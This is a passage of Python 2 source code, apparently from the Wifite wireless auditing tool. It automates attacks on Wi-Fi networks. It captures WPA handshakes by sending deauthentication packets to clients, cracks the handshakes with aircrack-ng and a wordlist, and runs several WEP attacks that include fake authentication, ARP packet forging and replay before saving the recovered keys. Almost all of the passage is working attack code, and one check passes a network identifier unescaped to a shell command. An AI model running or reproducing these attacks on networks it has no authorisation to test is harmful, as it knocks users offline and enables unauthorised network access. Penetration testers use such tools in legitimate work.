        elif line.endswith('Key (msg 2/4)') or line.endswith('Key (msg 4/4)'):
            while line.startswith(' ') or line.startswith('\t'): line = line[1:]
            line = line.replace('\t', ' ')
            while line.find('  ') != -1: line = line.replace('  ', ' ')
            return line.split(' ')[4]
    return ''


def attack_interrupted_prompt():
    """
        Promps user to decide if they want to exit,
        skip to cracking WPA handshakes,
        or continue attacking the remaining targets (if applicable).
        returns True if user chose to exit complete, False otherwise
    """
    global RUN_CONFIG
    should_we_exit = False
    # If there are more targets to attack, ask what to do next
    if RUN_CONFIG.TARGETS_REMAINING > 0:
        options = ''
        print GR + "\n [+] %s%d%s target%s remain%s" % (G, RUN_CONFIG.TARGETS_REMAINING, W,
                                                        '' if RUN_CONFIG.TARGETS_REMAINING == 1 else 's',
                                                        's' if RUN_CONFIG.TARGETS_REMAINING == 1 else '')
        print GR + " [+]" + W + " what do you want to do?"
        options += G + 'c' + W
        print G + "     [c]ontinue" + W + " attacking targets"

        if len(RUN_CONFIG.WPA_CAPS_TO_CRACK) > 0:
            options += W + ', ' + O + 's' + W
            print O + "     [s]kip" + W + " to cracking WPA cap files"
        options += W + ', or ' + R + 'e' + W
        print R + "     [e]xit" + W + " completely"
        ri = ''
        while ri != 'c' and ri != 's' and ri != 'e':
            ri = raw_input(GR + ' [+]' + W + ' please make a selection (%s): ' % options)

        if ri == 's':
            RUN_CONFIG.TARGETS_REMAINING = -1  # Tells start() to ignore other targets, skip to cracking
        elif ri == 'e':
            should_we_exit = True
    return should_we_exit


#
# Abstract base class for attacks.
# Attacks are required to implement the following methods:
#       RunAttack - Initializes the attack
#       EndAttack - Cleanly ends the attack
#
class Attack(object):
    __metaclass__ = abc.ABCMeta

    @abc.abstractmethod
    def RunAttack(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def EndAttack(self):
        raise NotImplementedError()


#################
# WPA FUNCTIONS #
#################
class WPAAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.clients = clients
        self.target = target
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            Abstract method for initializing the WPA attack
        '''
        self.wpa_get_handshake()

    def EndAttack(self):
        '''
            Abstract method for ending the WPA attack
        '''
        pass

    def wpa_get_handshake(self):
        """
            Opens an airodump capture on the target, dumping to a file.
            During the capture, sends deauthentication packets to the target both as
            general deauthentication packets and specific packets aimed at connected clients.
            Waits until a handshake is captured.
                "iface"   - interface to capture on
                "target"  - Target object containing info on access point
                "clients" - List of Client objects associated with the target
            Returns True if handshake was found, False otherwise
        """

        if self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0: self.RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1

        
      
        # Check if we already have a handshake for this SSID... If we do, generate a new filename
        save_index = 1
        while True:
            # Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap
            save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR  + str(self.target) + '_' + str(save_index) + '.cap'
            if not os.path.exists(save_as):
                break
            save_index += 1
            

        # Remove previous airodump output files (if needed)
        remove_airodump_files(self.RUN_CONFIG.temp + 'wpa')

        # Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)
        try:
            # Start airodump-ng process to capture handshakes
            cmd = ['airodump-ng',
                   '-w', self.RUN_CONFIG.temp + 'wpa',
                   '-c', self.target.channel,
                   '--bssid', self.target.bssid, self.iface]
            proc_read = Popen(cmd, stdout=DN, stderr=DN)

            # Setting deauthentication process here to avoid errors later on
            proc_deauth = None

            print ' %s starting %sWPA handshake capture%s on "%s" (%s) with signal strength %s%ddB%s' % \
                  (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT) + W, G, W, G + self.target.ssid + W, G + self.target.bssid +W, G, self.target.power, W)
            got_handshake = False

            seconds_running = 0

            target_clients = self.clients[:]
            client_index = -1
            start_time = time.time()
            # Deauth and check-for-handshake loop
            while not got_handshake and (
                    self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < self.RUN_CONFIG.WPA_ATTACK_TIMEOUT):
                if proc_read.poll() != None:
                    println_error("airodump-ng exited with status " + str(proc_read.poll()))
                    break
                time.sleep(1)
                seconds_running = int(time.time() - start_time)

                print "                                                          \r",
                print ' %s listening for handshake...\r' % \
                      (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)),
                stdout.flush()

                if seconds_running % self.RUN_CONFIG.WPA_DEAUTH_TIMEOUT == 0:
                    # Send deauth packets via aireplay-ng
                    cmd = ['aireplay-ng',
                           '--ignore-negative-one',
                           '-0',  # Attack method (Deauthentication)
                           str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send
                           '-a', self.target.bssid]

                    client_index += 1

                    if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
                        print " %s sending %s deauth to %s*broadcast*%s..." % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W,
                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, G, W),
                        client_index = -1
                    else:
                        print " %s sending %s deauth to %s... " % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, \
                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, \
                               G + target_clients[client_index].bssid  + W),
                        cmd.append('-h')
                        cmd.append(target_clients[client_index].bssid)
                    cmd.append(self.iface)
                    stdout.flush()

                    # Send deauth packets via aireplay, wait for them to complete.
                    proc_deauth = Popen(cmd, stdout=DN, stderr=DN)
                    proc_deauth.wait()
                    print "sent\r",
                    stdout.flush()

                # Copy current dump file for consistency
                if not os.path.exists(self.RUN_CONFIG.temp + 'wpa-01.cap'): continue
                copy(self.RUN_CONFIG.temp + 'wpa-01.cap', self.RUN_CONFIG.temp + 'wpa-01.cap.temp')

                # Save copy of cap file (for debugging)
                #remove_file('/root/new/wpa-01.cap')
                #copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')

                # Check for handshake
                if self.has_handshake(self.target, self.RUN_CONFIG.temp + 'wpa-01.cap.temp'):
                    got_handshake = True

                    try:
                        os.mkdir(self.RUN_CONFIG.WPA_HANDSHAKE_DIR)
                    except OSError:
                        pass

                    # Kill the airodump and aireplay processes
                    send_interrupt(proc_read)
                    send_interrupt(proc_deauth)

                    # Save a copy of the handshake
                    rename(self.RUN_CONFIG.temp + 'wpa-01.cap.temp', save_as)

                    print '\n %s %shandshake captured%s! saved as "%s"' % (
                    GR + sec_to_hms(seconds_running) + W, G, W, G + save_as +W)
                    self.RUN_CONFIG.WPA_FINDINGS.append(
                        '"%s" (%s) handshake captured' % (self.target.ssid, self.target.bssid))
                    self.RUN_CONFIG.WPA_FINDINGS.append('saved as %s' % (save_as))
                    self.RUN_CONFIG.WPA_FINDINGS.append('')

                    # Strip handshake if needed
                    if self.RUN_CONFIG.WPA_STRIP_HANDSHAKE: self.strip_handshake(save_as)

                    # Add the filename and SSID to the list of 'to-crack'
                    # Cracking will be handled after all attacks are finished.
                    self.RUN_CONFIG.WPA_CAPS_TO_CRACK.append(CapFile(save_as, self.target.ssid, self.target.bssid))

                    break  # Break out of while loop

                # No handshake yet
                os.remove(self.RUN_CONFIG.temp + 'wpa-01.cap.temp')

                # Check the airodump output file for new clients
                for client in self.RUN_CONFIG.RUN_ENGINE.parse_csv(self.RUN_CONFIG.temp + 'wpa-01.csv')[1]:
                    if client.station != self.target.bssid: continue
                    new_client = True
                    for c in target_clients:
                        if client.bssid == c.bssid:
                            new_client = False
                            break

                    if new_client:
                        print " %s %snew client%s found: %s                         " % \
                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, G, W, \
                               G + client.bssid + W)
                        target_clients.append(client)

            # End of Handshake wait loop.

            if not got_handshake:
                print R + ' [0:00:00]' + O + ' unable to capture handshake in time' + W

        except KeyboardInterrupt:
            print R + '\n (^C)' + O + ' WPA handshake capture interrupted' + W
            if attack_interrupted_prompt():
                remove_airodump_files(self.RUN_CONFIG.temp + 'wpa')
                send_interrupt(proc_read)
                send_interrupt(proc_deauth)
                print ''
                self.RUN_CONFIG.exit_gracefully(0)


        # clean up
        remove_airodump_files(self.RUN_CONFIG.temp + 'wpa')
        send_interrupt(proc_read)
        send_interrupt(proc_deauth)

        return got_handshake

    def has_handshake_tshark(self, target, capfile):
        """
            Uses TShark to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if file_search('tshark'):
            # Call Tshark to return list of EAPOL packets in cap file.
            cmd = ['tshark',
                   '-r', capfile,  # Input file
                   '-R', 'eapol',  # Filter (only EAPOL packets)
                   '-n']  # Do not resolve names (MAC vendors)
            proc = Popen(cmd, stdout=PIPE, stderr=DN)
            proc.wait()
            lines = proc.communicate()[0].split('\n')

            # Get list of all clients in cap file
            clients = []
            for line in lines:
                if line.find('appears to have been cut short') != -1 or line.find(
                        'Running as user "root"') != -1 or line.strip() == '':
                    continue

                while line.startswith(' '):  line = line[1:]
                while line.find('  ') != -1: line = line.replace('  ', ' ')

                fields = line.split(' ')
                # ensure tshark dumped correct info
                if len(fields) < 5:
                    continue

                src = fields[2].lower()
                dst = fields[4].lower()

                if src == target.bssid.lower() and clients.count(dst) == 0:
                    clients.append(dst)
                elif dst == target.bssid.lower() and clients.count(src) == 0:
                    clients.append(src)

            # Check each client for a handshake
            for client in clients:
                msg_num = 1  # Index of message in 4-way handshake (starts at 1)

                for line in lines:
                    if line.find('appears to have been cut short') != -1: continue
                    if line.find('Running as user "root"') != -1: continue
                    if line.strip() == '': continue

                    # Sanitize tshark's output, separate into fields
                    while line[0] == ' ': line = line[1:]
                    while line.find('  ') != -1: line = line.replace('  ', ' ')

                    fields = line.split(' ')

                    # Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
                    # This catches this glitch and fixes it.
                    if len(fields) < 8:
                        continue
                    elif len(fields) == 8:
                        fields.append('(msg')
                        fields.append('3/4)')

                    src = fields[2].lower()  # Source MAC address
                    dst = fields[4].lower()  # Destination MAC address
                    #msg = fields[9][0]      # The message number (1, 2, 3, or 4)
                    msg = fields[-1][0]

                    # First, third msgs in 4-way handshake are from the target to client
                    if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client):
                        continue
                    # Second, fourth msgs in 4-way handshake are from client to target
                    elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client):
                        continue

                    # The messages must appear in sequential order.
                    try:
                        if int(msg) != msg_num: continue
                    except ValueError:
                        continue

                    msg_num += 1

                    # We need the first 4 messages of the 4-way handshake
                    # Although aircrack-ng cracks just fine with only 3 of the messages...
                    if msg_num >= 4:
                        return True
        return False

    def has_handshake_cowpatty(self, target, capfile, nonstrict=True):
        """
            Uses cowpatty to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if not file_search('cowpatty'): return False

        # Call cowpatty to check if capfile contains a valid handshake.
        cmd = ['cowpatty',
               '-r', capfile,  # input file
               '-s', target.ssid,  # SSID
               '-c']  # Check for handshake
        # Uses frames 1, 2, or 3 for key attack
        if nonstrict: cmd.append('-2')
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        response = proc.communicate()[0]
        if response.find('incomplete four-way handshake exchange') != -1:
            return False
        elif response.find('Unsupported or unrecognized pcap file.') != -1:
            return False
        elif response.find('Unable to open capture file: Success') != -1:
            return False
        return True

    def has_handshake_pyrit(self, target, capfile):
        """
            Uses pyrit to check for a handshake.
            Returns "True" if handshake is found, false otherwise.
        """
        if not file_search('pyrit'): return False

        # Call pyrit to "Analyze" the cap file's handshakes.
        cmd = ['pyrit',
               '-r', capfile,
               'analyze']
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        hit_essid = False
        for line in proc.communicate()[0].split('\n'):
            # Iterate over every line of output by Pyrit
            if line == '' or line == None: continue
            if line.find("AccessPoint") != -1:
                hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
                            (line.lower().find(target.bssid.lower()) != -1)
                #hit_essid = (line.lower().find(target.bssid.lower()))

            else:
                # If Pyrit says it's good or workable, it's a valid handshake.
                if hit_essid and (line.find(', good, ') != -1 or \
                                              line.find(', workable, ') != -1):
                    return True
        return False

    def has_handshake_aircrack(self, target, capfile):
        """
            Uses aircrack-ng to check for handshake.
            Returns True if found, False otherwise.
        """
        if not file_search('aircrack-ng'): return False
        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
        proc_crack = Popen(crack, stdout=PIPE, stderr=DN, shell=True)
        proc_crack.wait()
        txt = proc_crack.communicate()[0]

        return (txt.find('Passphrase not in dictionary') != -1)

    def has_handshake(self, target, capfile):
        """
            Checks if .cap file contains a handshake.
            Returns True if handshake is found, False otherwise.
        """
        valid_handshake = True
        tried = False
        if self.RUN_CONFIG.WPA_HANDSHAKE_TSHARK:
            tried = True
            valid_handshake = self.has_handshake_tshark(target, capfile)

        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            tried = True
            valid_handshake = self.has_handshake_cowpatty(target, capfile)

        # Use CowPatty to check for handshake.
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_COWPATTY:
            tried = True
            valid_handshake = self.has_handshake_cowpatty(target, capfile)

        # Check for handshake using Pyrit if applicable
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_PYRIT:
            tried = True
            valid_handshake = self.has_handshake_pyrit(target, capfile)

        # Check for handshake using aircrack-ng
        if valid_handshake and self.RUN_CONFIG.WPA_HANDSHAKE_AIRCRACK:
            tried = True
            valid_handshake = self.has_handshake_aircrack(target, capfile)

        if tried: return valid_handshake
        println_error('unable to check for handshake: all handshake options are disabled!')
        self.RUN_CONFIG.exit_gracefully(1)

    def strip_handshake(self, capfile):
        """
            Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
            File in location 'capfile' is overwritten!
        """
        output_file = capfile
        if file_search('pyrit'):
            cmd = ['pyrit',
                   '-r', capfile,
                   '-o', output_file,
                   'stripLive']
            call(cmd, stdout=DN, stderr=DN)

        elif file_search('tshark'):
            # strip results with tshark
            cmd = ['tshark',
                   '-r', capfile,  # input file
                   '-R', 'eapol || wlan_mgt.tag.interpretation',  # filter
                   '-w', capfile + '.temp']  # output file
            proc_strip = call(cmd, stdout=DN, stderr=DN)

            rename(capfile + '.temp', output_file)

        else:
            println_error("unable to strip .cap file: neither pyrit nor tshark were found" + W)


##########################
# WPA CRACKING FUNCTIONS #
##########################
def wpa_crack(capfile, RUN_CONFIG):
    """
        Cracks cap file using aircrack-ng
        This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
        they can do so manually.
    """
    if RUN_CONFIG.WPA_DICTIONARY == '':
        println_error('no WPA dictionary found! use -dict <file> command-line argument')
        return False

    print GR + ' [0:00:00]' + W + ' cracking %s with %s' % (G + capfile.ssid + W, G + 'aircrack-ng' + W)
    start_time = time.time()
    cracked = False

    remove_file(RUN_CONFIG.temp + 'out.out')
    remove_file(RUN_CONFIG.temp + 'wpakey.txt')

    cmd = ['aircrack-ng',
           '-a', '2',  # WPA crack
           '-w', RUN_CONFIG.WPA_DICTIONARY,  # Wordlist
           '-l', RUN_CONFIG.temp + 'wpakey.txt',  # Save key to file
           '-b', capfile.bssid,  # BSSID of target
           capfile.filename]

    proc = Popen(cmd, stdout=open(RUN_CONFIG.temp + 'out.out', 'a'), stderr=DN)
    try:
        kt = 0  # Keys tested
        kps = 0  # Keys per second
        while True:
            time.sleep(1)

            if proc.poll() != None:  # aircrack stopped
                if os.path.exists(RUN_CONFIG.temp + 'wpakey.txt'):
                    # Cracked
                    inf = open(RUN_CONFIG.temp + 'wpakey.txt')
                    key = inf.read().strip()
                    inf.close()
                    RUN_CONFIG.WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' % (
                    G + capfile.ssid + W, G + capfile.bssid + W, C + key + W))
                    RUN_CONFIG.WPA_FINDINGS.append('')
                    t = Target(capfile.bssid, 0, 0, 0, 'WPA', capfile.ssid)
                    t.key = key
                    RUN_CONFIG.save_cracked(t)

                    print GR + '\n [+]' + W + ' cracked %s (%s)!' % (G + capfile.ssid + W, G + capfile.bssid)
                    println_info('key:    "%s"\n' % (C + key + W))
                    cracked = True
                else:
                    # Did not crack
                    print R + '\n [!]' + R + 'crack attempt failed' + O + ': passphrase not in dictionary' + W
                break

            inf = open(RUN_CONFIG.temp + 'out.out', 'r')
            lines = inf.read().split('\n')
            inf.close()
            outf = open(RUN_CONFIG.temp + 'out.out', 'w')
            outf.close()
            for line in lines:
                i = line.find(']')
                j = line.find('keys tested', i)
                if i != -1 and j != -1:
                    kts = line[i + 2:j - 1]
                    try:
                        kt = int(kts)
                    except ValueError:
                        pass
                i = line.find('(')
                j = line.find('k/s)', i)
                if i != -1 and j != -1:
                    kpss = line[i + 1:j - 1]
                    try:
                        kps = float(kpss)
                    except ValueError:
                        pass

            print "\r %s %s keys tested (%s%.2f keys/sec%s)   " % \
                  (GR + sec_to_hms(time.time() - start_time) + W, G + add_commas(kt) + W, G, kps, W),
            stdout.flush()

    except KeyboardInterrupt:
        print R + '\n (^C)' + O + ' WPA cracking interrupted' + W

    send_interrupt(proc)
    try:
        os.kill(proc.pid, SIGTERM)
    except OSError:
        pass

    return cracked


def add_commas(n):
    """
        Receives integer n, returns string representation of n with commas in thousands place.
        I'm sure there's easier ways of doing this... but meh.
    """
    strn = str(n)
    lenn = len(strn)
    i = 0
    result = ''
    while i < lenn:
        if (lenn - i) % 3 == 0 and i != 0: result += ','
        result += strn[i]
        i += 1
    return result


#################
# WEP FUNCTIONS #
#################
class WEPAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.target = target
        self.clients = clients
        self.RUN_CONFIG = config

    def RunAttack(self):
        '''
            Abstract method for dispatching the WEP crack
        '''
        self.attack_wep()

    def EndAttack(self):
        '''
            Abstract method for ending the WEP attack
        '''
        pass

    def attack_wep(self):
        """
        Attacks WEP-encrypted network.
        Returns True if key was successfully found, False otherwise.
        """
        if self.RUN_CONFIG.WEP_TIMEOUT <= 0: self.RUN_CONFIG.WEP_TIMEOUT = -1

        attacks_name=['arp-replay','chop-chop','fragmentation','caffe-latte', 'p0841', 'hirte']
        attacks_allowed=[self.RUN_CONFIG.WEP_ARP_REPLAY,self.RUN_CONFIG.WEP_CHOPCHOP,self.RUN_CONFIG.WEP_FRAGMENT,self.RUN_CONFIG.WEP_CAFFELATTE,self.RUN_CONFIG.WEP_P0841,self.RUN_CONFIG.WEP_HIRTE]

        total_attacks = len(attacks_name)  # 4 + (2 if len(clients) > 0 else 0)
        for allowed in attacks_allowed:
            if not allowed:
                total_attacks-=1

        if total_attacks <= 0:
            println_error('unable to initiate WEP attacks: no attacks are selected!')
            return False
        remaining_attacks = total_attacks

        print ' %s starting %s attack on "%s" (%s) with signal strength %s%ddB%s' % \
              (GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.encryption + W, G + self.target.ssid + W, G + self.target.bssid + W, G, self.target.power,W)

        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')

        # Start airodump process to capture packets
        cmd_airodump = ['airodump-ng',
                        '-w', self.RUN_CONFIG.temp + 'wep',  # Output file name (wep-01.cap, wep-01.csv)
                        '-c', self.target.channel,  # Wireless channel
                        '--bssid', self.target.bssid,
                        self.iface]
        proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
        proc_aireplay = None
        proc_aircrack = None

        successful = False  # Flag for when attack is successful
        started_cracking = False  # Flag for when we have started aircrack-ng
        client_mac = ''  # The client mac we will send packets to/from

        total_ivs = 0
        ivs = 0
        last_ivs = 0
        for attack_num in xrange(0, 6):

            # Skip disabled attacks
            if not attacks_allowed[attack_num]:
                continue
            
            remaining_attacks -= 1

            try:

                if self.wep_fake_auth(self.iface, self.target, sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)):
                    # Successful fake auth
                    client_mac = self.RUN_CONFIG.THIS_MAC
                elif not self.RUN_CONFIG.WEP_IGNORE_FAKEAUTH:
                    send_interrupt(proc_aireplay)
                    send_interrupt(proc_airodump)
                    println_error('unable to fake-authenticate with target')
                    println_error('to skip this speed bump, select "ignore-fake-auth" at command-line')
                    return False

                remove_file(self.RUN_CONFIG.temp + 'arp.cap')
                # Generate the aireplay-ng arguments based on attack_num and other params
                cmd = self.get_aireplay_command(self.iface, attack_num, self.target, self.clients, client_mac)
                if cmd == '': continue
                if proc_aireplay != None:
                    send_interrupt(proc_aireplay)
                proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)

                print '\r %s attacking "%s" (%s) via %s attack' % (
                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G + self.target.ssid + W,G + self.target.bssid + W, G + attacks_name[attack_num] + W)
                # 


                print ' %s captured %s%d%s ivs @ %s iv/sec' % (
                GR + sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT) + W, G, total_ivs, W, G + '0' + W),
                stdout.flush()

                time.sleep(1)
                if attack_num == 1:
                    # Send a deauth packet to broadcast and all clients *just because!*
                    self.wep_send_deauths(self.iface, self.target, self.clients)
                last_deauth = time.time()

                replaying = False
                time_started = time.time()
                while time.time() - time_started < self.RUN_CONFIG.WEP_TIMEOUT:
                    # time.sleep(5)
                    for time_count in xrange(0, 6):
                        if self.RUN_CONFIG.WEP_TIMEOUT == -1:
                            current_hms = "[endless]"
                        else:
                            current_hms = sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT - (time.time() - time_started))
                        print "\r %s\r" % (GR + current_hms + W),
                        stdout.flush()
                        time.sleep(1)

                    # Calculates total seconds remaining

                    # Check number of IVs captured
                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(self.RUN_CONFIG.temp + 'wep-01.csv')[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print "\r                                                   ",
                        print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
                              (GR + current_hms + W, G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),

                        if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
                            print "\r %s deauthing to generate packets..." % (GR + current_hms + W),
                            self.wep_send_deauths(self.iface, self.target, self.clients)
                            print "done\r",
                            last_deauth = time.time()

                        last_ivs = ivs
                        stdout.flush()
                        if total_ivs + ivs >= self.RUN_CONFIG.WEP_CRACK_AT_IVS and not started_cracking:
                            # Start cracking
                            cmd = ['aircrack-ng',
                                   '-a', '1',
                                   '-l', self.RUN_CONFIG.temp + 'wepkey.txt']
                            #temp + 'wep-01.cap']
                            # Append all .cap files in temp directory (in case we are resuming)
                            for f in os.listdir(self.RUN_CONFIG.temp):
                                if f.startswith('wep-') and f.endswith('.cap'):
                                    cmd.append(self.RUN_CONFIG.temp + f)

                            print "\r %s started %s (%sover %d ivs%s)" % (
                            GR + current_hms + W, G + 'cracking' + W, G, self.RUN_CONFIG.WEP_CRACK_AT_IVS, W)
                            proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
                            started_cracking = True

                    # Check if key has been cracked yet.
                    if os.path.exists(self.RUN_CONFIG.temp + 'wepkey.txt'):
                        # Cracked!
                        infile = open(self.RUN_CONFIG.temp + 'wepkey.txt', 'r')
                        key = infile.read().replace('\n', '')
                        infile.close()
                        print '\n\n %s %s "%s" (%s)! key: "%s"' % (
                        current_hms, G + 'cracked', self.target.ssid + W, G + self.target.bssid + W, C + key + W)
                        self.RUN_CONFIG.WEP_FINDINGS.append(
                            'cracked "%s" (%s), key: "%s"' % (self.target.ssid, self.target.bssid, key))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = key
                        self.RUN_CONFIG.save_cracked(t)

                        # Kill processes
                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        try:
                            os.kill(proc_aireplay, SIGTERM)
                        except:
                            pass
                        send_interrupt(proc_aircrack)
                        # Remove files generated by airodump/aireplay/packetforce
                        time.sleep(0.5)
                        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
                        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
                        return True

                    # Check if aireplay is still executing
                    if proc_aireplay.poll() == None:
                        if replaying:
                            print ', ' + G + 'replaying         \r' + W,
                        elif attack_num == 1 or attack_num == 2:
                            print ', waiting for packet    \r',
                        stdout.flush()
                        continue

                    # At this point, aireplay has stopped
                    if attack_num != 1 and attack_num != 2:
                        print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R + current_hms, O, W)
                        break  # Break out of attack's While loop

                    # Check for a .XOR file (we expect one when doing chopchop/fragmentation
                    xor_file = ''
                    for filename in sorted(os.listdir(self.RUN_CONFIG.temp)):
                        if filename.lower().endswith('.xor'): xor_file = self.RUN_CONFIG.temp + filename
                    if xor_file == '':
                        print '\r %s attack failed: %sunable to generate keystream        %s' % (R + current_hms, O, W)
                        break

                    remove_file(self.RUN_CONFIG.temp + 'arp.cap')
                    cmd = ['packetforge-ng',
                           '-0',
                           '-a', self.target.bssid,
                           '-h', client_mac,
                           '-k', '192.168.1.2',
                           '-l', '192.168.1.100',
                           '-y', xor_file,
                           '-w', self.RUN_CONFIG.temp + 'arp.cap',
                           self.iface]
                    proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)
                    proc_pforge.wait()
                    forged_packet = proc_pforge.communicate()[0]
                    remove_file(xor_file)
                    if forged_packet == None: result = ''
                    forged_packet = forged_packet.strip()
                    if not forged_packet.find('Wrote packet'):
                        print "\r %s attack failed: unable to forget ARP packet               %s" % (
                        R + current_hms + O, W)
                        break

                    # We were able to forge a packet, so let's replay it via aireplay-ng
                    cmd = ['aireplay-ng',
                           '--ignore-negative-one',
                           '--arpreplay',
                           '-b', self.target.bssid,
                           '-r', self.RUN_CONFIG.temp + 'arp.cap',  # Used the forged ARP packet
                           '-F',  # Select the first packet
                           self.iface]
                    proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)

                    print '\r %s forged %s! %s...         ' % (
                    GR + current_hms + W, G + 'arp packet' + W, G + 'replaying' + W)
                    replaying = True

                # After the attacks, if we are already cracking, wait for the key to be found!
                while started_cracking:  # ivs > WEP_CRACK_AT_IVS:
                    time.sleep(5)
                    # Check number of IVs captured
                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(self.RUN_CONFIG.temp + 'wep-01.csv')[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print GR + " [endless]" + W + " captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
                                                      (G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
                        last_ivs = ivs
                        stdout.flush()

                    # Check if key has been cracked yet.
                    if os.path.exists(self.RUN_CONFIG.temp + 'wepkey.txt'):
                        # Cracked!
                        infile = open(self.RUN_CONFIG.temp + 'wepkey.txt', 'r')
                        key = infile.read().replace('\n', '')
                        infile.close()
                        print GR + '\n\n [endless] %s %s (%s)! key: "%s"' % (
                        G + 'cracked', self.target.ssid + W, G + self.target.bssid + W, C + key + W)
                        self.RUN_CONFIG.WEP_FINDINGS.append(
                            'cracked %s (%s), key: "%s"' % (self.target.ssid, self.target.bssid, key))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = key
                        self.RUN_CONFIG.save_cracked(t)

                        # Kill processes
                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        send_interrupt(proc_aircrack)
                        # Remove files generated by airodump/aireplay/packetforce
                        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
                        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
                        return True

            # Keyboard interrupt during attack
            except KeyboardInterrupt:
                print R + '\n (^C)' + O + ' WEP attack interrupted\n' + W

                send_interrupt(proc_airodump)
                if proc_aireplay != None:
                    send_interrupt(proc_aireplay)
                if proc_aircrack != None:
                    send_interrupt(proc_aircrack)

                options = []
                selections = []
                if remaining_attacks > 0:
                    options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
                                   (G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
                    selections.append(G + 'c' + W)

                if self.RUN_CONFIG.TARGETS_REMAINING > 0:
                    options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
                                   (O, W, self.RUN_CONFIG.TARGETS_REMAINING,
                                    's' if self.RUN_CONFIG.TARGETS_REMAINING != 1 else ''))
                    selections.append(O + 's' + W)

                options.append('%sexit%s     the program completely' % (R, W))
                selections.append(R + 'e' + W)

                if len(options) > 1:
                    # Ask user what they want to do, Store answer in "response"
                    println_info('what do you want to do?')
                    response = ''
                    while response != 'c' and response != 's' and response != 'e':
                        for option in options:
                            print '     %s' % option
                        response = raw_input(
                            GR + ' [+]' + W + ' please make a selection (%s): ' % (', '.join(selections))).lower()[0]
                else:
                    response = 'e'

                if response == 'e' or response == 's':
                    println_debug("Exit or skip target (either way, stop this attack)")
                    # Exit or skip target (either way, stop this attack)
                    if self.RUN_CONFIG.WEP_SAVE and total_ivs + ivs > 0:
                        # Save packets
                        self.save_wep_packet(self.target, total_ivs + ivs)
                    println_debug("Exit or skip target (either way, stop this attack)")
                    println_debug("Remove files generated by airodump/aireplay/packetforce")
                    # Remove files generated by airodump/aireplay/packetforce
                    for filename in os.listdir('.'):
                        if filename.startswith('replay_arp-') and filename.endswith('.cap'):
                            remove_file(filename)
                    remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
